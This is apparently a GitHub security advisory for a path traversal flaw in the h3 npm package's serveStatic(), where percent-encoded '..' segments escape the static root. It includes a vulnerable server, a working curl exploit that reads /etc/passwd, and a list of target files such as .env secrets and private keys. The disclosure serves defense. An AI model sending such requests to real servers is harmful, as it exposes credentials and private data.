# [M] h3 has a Path Traversal via Percent-Encoded Dot Segments in serveStatic Allows Arbitrary File Read

## Summary
Severity: Medium
Advisory: GHSA-wr4h-v87w-p3r7
CWE: CWE-116, CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-wr4h-v87w-p3r7
Type: github-advisory

## Affected
- npm: `h3` — affected >=2.0.0 <2.0.1-rc.15
- npm: `h3` — affected >=0 <1.15.6

## Details
## Summary

`serveStatic()` in h3 is vulnerable to path traversal via percent-encoded dot segments (`%2e%2e`), allowing an unauthenticated attacker to read arbitrary files outside the intended static directory on Node.js deployments.

## Details

The vulnerability exists in `src/utils/static.ts` at [line 86](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/static.ts#L86):

```typescript
const originalId = decodeURI(withLeadingSlash(withoutTrailingSlash(event.url.pathname)));
```

On Node.js, h3 uses srvx's `FastURL` class to parse request URLs. Unlike the standard WHATWG `URL` parser, `FastURL` extracts the pathname via raw string slicing for performance — it does **not** normalize dot segments (`.` / `..`) or resolve percent-encoded equivalents (`%2e`).

This means a request to `/%2e%2e/` will have `event.url.pathname` return `/%2e%2e/` verbatim, whereas the standard `URL` parser would normalize it to `/` (resolving `..` upward).

The `serveStatic()` function then calls `decodeURI()` on this raw pathname, which decodes `%2e` to `.`, producing `/../`. The resulting path containing `../` traversal sequences is passed directly to the user-provided `getMeta()` and `getContents()` callbacks with no sanitization or traversal validation.

When these callbacks perform filesystem operations (the intended and documented usage), the `../` sequences resolve against the filesystem, escaping the static root directory.


Before exploit:

<img width="761" height="97" alt="image" src="https://github.com/user-attachments/assets/798f9d3d-f76c-4c29-aca3-5a6ccd3b3627" />

### Vulnerability chain

```
1. Attacker sends:    GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd
2. FastURL.pathname:  /%2e%2e/%2e%2e/%2e%2e/etc/passwd  (raw, no normalization)
3. decodeURI():       /../../../etc/passwd                (%2e decoded to .)
4. getMeta(id):       id = "/../../../etc/passwd"         (no traversal check)
5. path.join(root,id): /etc/passwd                        (.. resolved by OS)
6. Response:          contents of /etc/passwd
```

## PoC

### Vulnerable server (`server.ts`)

```typescript
import { H3, serveStatic } from "h3";
import { serve } from "h3/node";
import { readFileSync, statSync } from "node:fs";
import { join, resolve } from "node:path";

const STATIC_ROOT = resolve("./public");
const app = new H3();

app.all("/**", (event) =>
  serveStatic(event, {
    getMeta: (id) => {
      const filePath = join(STATIC_ROOT, id);
      try {
        const stat = statSync(filePath);
        return { size: stat.size, mtime: stat.mtime };
      } catch {
        return undefined;
      }
    },
    getContents: (id) => {
      const filePath = join(STATIC_ROOT, id);
      try {
        return readFileSync(filePath);
      } catch {
        return undefined;
      }
    },
  })
);

serve({ fetch: app.fetch });
```

### Exploit

```bash
# Read /etc/passwd (adjust number of %2e%2e segments based on static root depth)
curl -s --path-as-is "http://localhost:3000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

### Result

```
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```


Proof:

<img width="940" height="703" alt="image" src="https://github.com/user-attachments/assets/f452e061-847a-424c-9dda-dfbf899687b1" />

Pwned by **0xkakashi** 

<img width="942" height="74" alt="image" src="https://github.com/user-attachments/assets/db881519-1456-4e4c-a751-d8781b7abe95" />


## Impact

An unauthenticated remote attacker can read arbitrary files from the server's filesystem by sending a crafted HTTP request with `%2e%2e` (percent-encoded `..`) path segments to any endpoint served by `serveStatic()`.

This affects any h3 v2.x application using `serveStatic()` running on Node.js (where the `FastURL` fast path is used). Applications running on runtimes that provide a pre-parsed `URL` object (e.g., Cloudflare Workers, Deno) may not be affected, as `FastURL`'s raw string slicing is bypassed.

**Exploitable files include but are not limited to:**
- `/etc/passwd`, `/etc/shadow` (if readable)
- Application source code and configuration files
- `.env` files containing secrets, API keys, database credentials
- Private keys and certificates

## References
- https://github.com/h3js/h3/security/advisories/GHSA-wr4h-v87w-p3r7
- https://github.com/h3js/h3/commit/0e751b4059060f2ade01a0bdfd96b0f5ffc8a26d
- https://github.com/h3js/h3
- https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/static.ts#L86
